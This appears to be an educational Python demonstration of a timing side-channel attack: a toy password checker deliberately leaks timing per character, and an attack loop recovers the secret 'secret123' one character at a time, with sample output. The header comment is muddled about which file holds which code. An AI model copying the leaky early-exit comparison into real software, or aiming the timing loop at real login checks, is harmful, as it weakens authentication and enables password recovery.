# vulnerable.py: Contains the code that performs the timing attack, calling the function from vulnerable.py.
import time

SECRET = "secret123"

def delay_correct():
    """Delay when a character is correct."""
    time.sleep(0.02)

def delay_incorrect():
    """Smaller delay when a character is incorrect."""
    time.sleep(0.005)

def check_password(guess):
    """
    Function that checks each character of the guess against the SECRET.
    Calls different functions to introduce delays based on correctness.
    """
    for i in range(len(SECRET)):
        if i >= len(guess) or guess[i] != SECRET[i]:
            delay_incorrect()  # Introduce a delay for incorrect characters
            return False
        else:
            delay_correct()  # Introduce a larger delay for correct characters
    return len(guess) == len(SECRET)

if __name__ == "__main__":
    # Running some tests (not necessary for attack)
    print(check_password("secret123"))  # Should return True
    print(check_password("wrong123"))   # Should return False


import time
import string
#from vulnerable import check_password

def timing_attack():
    """
    Perform a timing attack to guess the password by measuring the
    time taken for each guess and inferring the correct characters.
    """
    guessed_password = ""
    possible_characters = string.ascii_lowercase + string.digits
    
    while len(guessed_password) < len("secret123"):
        best_time = 0
        best_char = ''
        
        for char in possible_characters:
            guess = guessed_password + char
            start_time = time.time()
            check_password(guess)  # Call the vulnerable function
            elapsed_time = time.time() - start_time
            
            if elapsed_time > best_time:
                best_time = elapsed_time
                best_char = char
        
        guessed_password += best_char
        print(f"Guessed so far: {guessed_password}")
    
    return guessed_password

# Run the timing attack
guessed_secret = timing_attack()
print(f"Guessed secret: {guessed_secret}")

"""
Guessed so far: s
Guessed so far: se
Guessed so far: sec
Guessed so far: secr
Guessed so far: secre
Guessed so far: secret
Guessed so far: secret1
Guessed so far: secret12
Guessed so far: secret123

"""